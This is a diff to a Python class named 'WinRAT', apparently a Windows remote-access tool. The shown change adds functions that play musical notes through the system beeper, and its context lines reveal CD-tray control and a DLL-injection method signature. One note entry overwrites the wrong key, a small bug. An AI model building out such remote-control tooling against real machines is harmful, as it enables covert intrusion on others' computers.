@@ -18,9 +18,6 @@ def keyboard(code, flags=0):
 
 class WinRAT:
 
-	def __init__(self):
-		self.operations = ["cdtray", "mousepos"]
-
 	"""
 		@method cdtray
 		@brief Function to open / close the CD/DVD tray
@@ -142,6 +139,96 @@ class WinRAT:
 
 	def beep(self, dwFreq:int, dwDuration:int):
 		kernel32api.Beep(dwFreq, dwDuration)
+
+
+	def playNote(self, note):
+
+		name = note.split(":")[0]
+		duration = 1
+		if not len(note.split(":")) == 1:
+			duration = int(note.split(":")[1])
+
+		notes = dict()
+
+		# Base octave
+		notes["C0"] = 16
+		notes["C#0"] = 17
+		notes["D0"] = 18
+		notes["D#0"] =19
+		notes["E0"] = 21
+		notes["F0"] = 22
+		notes["F#0"] = 23
+		notes["G0"] = 25
+		notes["G#0"] = 26
+		notes["A0"] = 28
+		notes["A#0"] = 29
+		notes["B0"] = 31
+
+		# First octave
+		notes["C1"] = 33
+		notes["C#1"] = 35
+		notes["D1"] = 37
+		notes["D#1"] =39
+		notes["E1"] = 41
+		notes["F1"] = 44
+		notes["F#1"] = 46
+		notes["G1"] = 49
+		notes["G#1"] = 52
+		notes["A1"] = 55
+		notes["A#0"] = 58
+		notes["B1"] = 62
+
+		# Second octave
+		notes["C2"] = 65
+		notes["C#2"] = 69
+		notes["D2"] = 73
+		notes["D#2"] =78
+		notes["E2"] = 82
+		notes["F2"] = 87
+		notes["F#2"] = 93
+		notes["G2"] = 98
+		notes["G#2"] = 104
+		notes["A2"] = 110
+		notes["A#2"] = 117
+		notes["B2"] = 123
+
+		# Third octave
+		notes["C3"] = 131
+		notes["C#3"] = 139
+		notes["D3"] = 147
+		notes["D#3"] =156
+		notes["E3"] = 165
+		notes["F3"] = 175
+		notes["F#3"] = 185
+		notes["G3"] = 196
+		notes["G#3"] = 208
+		notes["A3"] = 220
+		notes["A#3"] = 233
+		notes["B3"] = 247
+
+		# Fourth octave 
+		notes["C4"] = 262
+		notes["C#4"] = 277
+		notes['D4'] = 294
+		notes["D#4"] = 311
+		notes['E4'] = 330
+		notes['F4'] = 349
+		notes['F#4'] = 370
+		notes['G4'] = 392
+		notes['G#4'] = 415
+		notes['A4'] = 440
+		notes['A#4'] = 466
+		notes['B4']= 494
+
+		if name == ".":
+			time.sleep( 0.125* duration)
+
+		else:
+			self.beep(dwFreq=notes[name],  dwDuration=125 * duration)
+
+	def playNotes(self, notes):
+		for note in notes:
+			self.playNote(note)
 
 	def injectdll(self, pid:int, dll:str) -> bool:
 
